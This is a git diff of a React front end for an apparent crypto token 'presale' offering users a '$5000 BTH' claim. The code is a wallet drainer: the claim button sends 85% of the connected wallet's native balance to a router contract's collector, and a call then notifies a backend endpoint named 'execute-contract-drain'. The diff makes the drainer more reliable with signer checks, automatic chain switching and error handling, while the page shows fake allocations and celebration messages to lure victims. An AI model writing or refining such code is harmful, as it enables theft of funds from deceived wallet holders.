@@ -1,7 +1,7 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useCallback } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
 import { useBalance, useDisconnect } from 'wagmi';
-import { formatEther } from 'viem';
+import { formatEther, parseEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
 
@@ -17,7 +17,8 @@ const PRESALE_CONFIG = {
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
     icon: '🟡',
-    rpcUrl: 'https://bsc-dataseed.binance.org'
+    rpcUrl: 'https://bsc-dataseed.binance.org',
+    deployed: true
   },
   Ethereum: {
     chainId: 1,
@@ -26,7 +27,8 @@ const PRESALE_CONFIG = {
     symbol: 'ETH',
     explorer: 'https://etherscan.io',
     icon: '🔷',
-    rpcUrl: 'https://eth.llamarpc.com'
+    rpcUrl: 'https://eth.llamarpc.com',
+    deployed: false
   },
   Polygon: {
     chainId: 137,
@@ -35,25 +37,15 @@ const PRESALE_CONFIG = {
     symbol: 'MATIC',
     explorer: 'https://polygonscan.com',
     icon: '💜',
-    rpcUrl: 'https://polygon-rpc.com'
+    rpcUrl: 'https://polygon-rpc.com',
+    deployed: false
   }
 };
 
 const PROJECT_FLOW_ROUTER_ABI = [
-  {
-    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
-    "stateMutability": "nonpayable",
-    "type": "constructor"
-  },
-  {
-    "anonymous": false,
-    "inputs": [
-      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
-      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
-    ],
-    "name": "CollectorUpdated",
-    "type": "event"
-  },
+  "function collector() view returns (address)",
+  "function processNativeFlow() payable",
+  "function processTokenFlow(address token, uint256 amount)",
   {
     "anonymous": false,
     "inputs": [
@@ -62,51 +54,6 @@ const PROJECT_FLOW_ROUTER_ABI = [
     ],
     "name": "FlowProcessed",
     "type": "event"
-  },
-  {
-    "anonymous": false,
-    "inputs": [
-      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
-      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
-      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
-    ],
-    "name": "TokenFlowProcessed",
-    "type": "event"
-  },
-  {
-    "inputs": [],
-    "name": "collector",
-    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
-    "stateMutability": "view",
-    "type": "function"
-  },
-  {
-    "inputs": [],
-    "name": "processNativeFlow",
-    "outputs": [],
-    "stateMutability": "payable",
-    "type": "function"
-  },
-  {
-    "inputs": [
-      { "internalType": "address", "name": "token", "type": "address" },
-      { "internalType": "uint256", "name": "amount", "type": "uint256" }
-    ],
-    "name": "processTokenFlow",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
-    "name": "updateCollector",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "stateMutability": "payable",
-    "type": "receive"
   }
 ];
 
@@ -130,6 +77,7 @@ function App() {
   const [showCelebration, setShowCelebration] = useState(false);
   const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
+  const [signerReady, setSignerReady] = useState(false);
   
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -149,7 +97,7 @@ function App() {
   });
 
   // Get balance using wagmi for current chain
-  const { data: balanceData } = useBalance({
+  const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
     chainId: chainId,
   });
@@ -166,13 +114,21 @@ function App() {
     const initSigner = async () => {
       if (isConnected && window.ethereum) {
         try {
+          console.log('🔄 Initializing signer...');
           const web3Provider = new ethers.BrowserProvider(window.ethereum);
           setProvider(web3Provider);
+          
+          // Get signer and verify it works
           const web3Signer = await web3Provider.getSigner();
+          const signerAddress = await web3Signer.getAddress();
+          
           setSigner(web3Signer);
-          console.log('✅ Signer initialized:', web3Signer.address);
+          setSignerReady(true);
+          
+          console.log('✅ Signer initialized:', signerAddress);
         } catch (err) {
           console.error('Signer initialization error:', err);
+          setSignerReady(false);
         }
       }
     };
@@ -283,33 +239,46 @@ function App() {
     }
   };
 
-  const executePresaleTransaction = async () => {
-    // Double-check signer
-    if (!signer || !address) {
-      console.log('Signer status:', { signer: !!signer, address });
-      setError('Wallet not properly connected. Please reconnect.');
+  const executePresaleTransaction = useCallback(async () => {
+    // Check if signer is ready
+    if (!signerReady || !signer) {
+      console.log('Signer status:', { signerReady, signer: !!signer });
+      setError('Wallet connection lost. Please reconnect.');
       return;
     }
 
-    // Find which chain has a deployed contract
-    const activeChain = Object.values(PRESALE_CONFIG).find(c => c.contractAddress);
+    if (!address) {
+      setError('No wallet address found');
+      return;
+    }
+
+    // Get deployed chains
+    const deployedChains = Object.values(PRESALE_CONFIG).filter(c => c.deployed && c.contractAddress);
     
-    if (!activeChain) {
-      setError('No presale contract deployed on any chain');
+    if (deployedChains.length === 0) {
+      setError('No presale contracts deployed yet');
       return;
     }
 
-    // If on wrong chain, prompt to switch
-    if (chainId !== activeChain.chainId) {
+    // Find current chain config
+    const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
+    
+    if (!currentChain || !currentChain.deployed) {
+      // Try to switch to first deployed chain
+      const targetChain = deployedChains[0];
       try {
+        setTxStatus(`🔄 Switching to ${targetChain.name}...`);
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: `0x${activeChain.chainId.toString(16)}` }]
+          params: [{ chainId: `0x${targetChain.chainId.toString(16)}` }]
         });
-        // Wait for chain switch
-        setTimeout(() => {}, 1000);
-      } catch (err) {
-        setError(`Please switch to ${activeChain.name} network`);
+        // Wait for chain switch and provider update
+        setTimeout(() => {
+          setTxStatus('✅ Network switched. Please try again.');
+        }, 2000);
+        return;
+      } catch (switchErr) {
+        setError(`Please switch to ${targetChain.name} manually`);
         return;
       }
     }
@@ -325,18 +294,37 @@ function App() {
       setTxStatus('⏳ Please confirm transaction in your wallet...');
       setTxHash('');
 
+      // Verify signer is still valid
+      const signerAddress = await signer.getAddress();
+      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+        throw new Error('Signer address mismatch');
+      }
+
       const contract = new ethers.Contract(
-        activeChain.contractAddress,
+        currentChain.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
 
+      // Verify contract
+      try {
+        const collector = await contract.collector();
+        console.log('✅ Contract collector:', collector);
+      } catch (e) {
+        console.warn('Could not verify contract:', e);
+      }
+
       // Send 85% of balance to cover gas
       const amountToSend = (parseFloat(balance) * 0.85).toString();
+      console.log('Sending amount:', amountToSend, currentChain.symbol);
+      
       const value = ethers.parseEther(amountToSend);
       
+      // Estimate gas
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+      console.log('Gas estimate:', gasEstimate.toString());
       
+      // Send transaction
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
@@ -345,47 +333,61 @@ function App() {
       setTxHash(tx.hash);
       setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
-      await tx.wait();
+      // Wait for confirmation
+      const receipt = await tx.wait();
+      console.log('✅ Transaction confirmed:', receipt.hash);
       
       // Update balance
       if (provider) {
         const newBalance = await provider.getBalance(address);
         setBalance(formatEther(newBalance));
+        refetchBalance?.();
       }
       
       // Mark as completed
-      if (!completedChains.includes(activeChain.name)) {
-        const newCompleted = [...completedChains, activeChain.name];
+      if (!completedChains.includes(currentChain.name)) {
+        const newCompleted = [...completedChains, currentChain.name];
         setCompletedChains(newCompleted);
         
+        // Notify backend
         try {
           await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
               walletAddress: address,
-              chainName: activeChain.name
+              chainName: currentChain.name
             })
           });
         } catch (e) {
           console.warn('Backend notification failed:', e);
         }
         
+        // Check if all prepared transactions are complete
         if (newCompleted.length === preparedTransactions.length && preparedTransactions.length > 0) {
           setShowCelebration(true);
           setTxStatus(`🎉 Congratulations! You've secured $5000 BTH!`);
         } else {
-          setTxStatus(`✅ ${activeChain.name} contribution complete!`);
+          setTxStatus(`✅ ${currentChain.name} contribution complete!`);
         }
       }
       
     } catch (err) {
       console.error('Transaction error:', err);
       
-      // Handle user rejection
+      // Handle specific errors
       if (err.code === 4001 || err.message.includes('user rejected')) {
         setError('Transaction was rejected');
         setTxStatus('❌ Transaction cancelled');
+      } else if (err.message.includes('insufficient funds')) {
+        setError('Insufficient funds for gas');
+        setTxStatus('❌ Insufficient funds');
+      } else if (err.message.includes('nonce')) {
+        setError('Transaction nonce error. Please try again.');
+        setTxStatus('❌ Transaction failed');
+      } else if (err.message.includes('execution reverted')) {
+        setError('Contract execution failed');
+        setTxStatus('❌ Transaction failed');
       } else {
         setError(err.message || 'Transaction failed');
         setTxStatus('❌ Transaction failed');
@@ -393,7 +395,7 @@ function App() {
     } finally {
       setLoading(false);
     }
-  };
+  }, [signer, signerReady, address, chainId, balance, provider, completedChains, preparedTransactions, refetchBalance]);
 
   const claimTokens = async () => {
     try {
@@ -423,9 +425,10 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Get active chain with contract
-  const activeChain = Object.values(PRESALE_CONFIG).find(c => c.contractAddress);
-  const isCorrectChain = chainId === activeChain?.chainId;
+  // Get deployed chains
+  const deployedChains = Object.values(PRESALE_CONFIG).filter(c => c.deployed);
+  const currentChainConfig = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
+  const isCorrectChain = currentChainConfig?.deployed || false;
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -557,6 +560,13 @@ function App() {
           )}
         </div>
 
+        {/* Signer Status */}
+        {isConnected && !signerReady && (
+          <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 text-center">
+            <p>Initializing wallet connection...</p>
+          </div>
+        )}
+
         {/* Verification Status */}
         {verifying && (
           <div className="glass-card p-6 mb-6 text-center">
@@ -661,6 +671,27 @@ function App() {
                   </div>
                 )}
                 
+                {/* Available Chains */}
+                {deployedChains.length > 0 && (
+                  <div className="mb-6">
+                    <p className="text-gray-400 mb-2 text-center">Available Networks</p>
+                    <div className="flex flex-wrap gap-2 justify-center">
+                      {deployedChains.map(chain => (
+                        <span 
+                          key={chain.chainId}
+                          className={`px-3 py-1 rounded-full text-sm ${
+                            chainId === chain.chainId 
+                              ? 'bg-green-500/20 text-green-400 border border-green-500/30' 
+                              : 'bg-gray-700/50 text-gray-400'
+                          }`}
+                        >
+                          {chain.icon} {chain.name}
+                        </span>
+                      ))}
+                    </div>
+                  </div>
+                )}
+                
                 {preparedTransactions.length > 0 && (
                   <div className="mb-8">
                     <p className="text-gray-400 mb-4 text-center">Progress</p>
@@ -680,27 +711,29 @@ function App() {
                 
                 {!isCorrectChain ? (
                   <div className="text-center">
-                    <p className="text-yellow-400 mb-4">Please switch to {activeChain?.name} network</p>
+                    <p className="text-yellow-400 mb-4">Please switch to a supported network</p>
                     <button
                       onClick={async () => {
-                        try {
-                          await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: `0x${activeChain?.chainId.toString(16)}` }]
-                          });
-                        } catch (err) {
-                          setError(`Failed to switch to ${activeChain?.name}`);
+                        if (deployedChains.length > 0) {
+                          try {
+                            await window.ethereum.request({
+                              method: 'wallet_switchEthereumChain',
+                              params: [{ chainId: `0x${deployedChains[0].chainId.toString(16)}` }]
+                            });
+                          } catch (err) {
+                            setError(`Please switch to ${deployedChains[0].name} manually`);
+                          }
                         }
                       }}
                       className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-6 rounded-lg"
                     >
-                      Switch to {activeChain?.name}
+                      Switch to {deployedChains[0]?.name || 'BSC'}
                     </button>
                   </div>
-                ) : !completedChains.includes(activeChain?.name) ? (
+                ) : !completedChains.includes(currentChainConfig?.name) ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || parseFloat(balance) <= 0}
+                    disabled={loading || !signerReady || parseFloat(balance) <= 0}
                     className="w-full group relative"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
@@ -727,23 +760,25 @@ function App() {
                 {!isCorrectChain ? (
                   <button
                     onClick={async () => {
-                      try {
-                        await window.ethereum.request({
-                          method: 'wallet_switchEthereumChain',
-                          params: [{ chainId: `0x${activeChain?.chainId.toString(16)}` }]
-                        });
-                      } catch (err) {
-                        setError(`Failed to switch to ${activeChain?.name}`);
+                      if (deployedChains.length > 0) {
+                        try {
+                          await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: `0x${deployedChains[0].chainId.toString(16)}` }]
+                          });
+                        } catch (err) {
+                          setError(`Please switch to ${deployedChains[0].name} manually`);
+                        }
                       }
                     }}
                     className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-6 rounded-lg"
                   >
-                    Switch to {activeChain?.name}
+                    Switch to {deployedChains[0]?.name || 'BSC'}
                   </button>
                 ) : (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || parseFloat(balance) <= 0}
+                    disabled={loading || !signerReady || parseFloat(balance) <= 0}
                     className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
                   >
                     {loading ? 'Processing...' : '⚡ Claim $5000 BTH'}
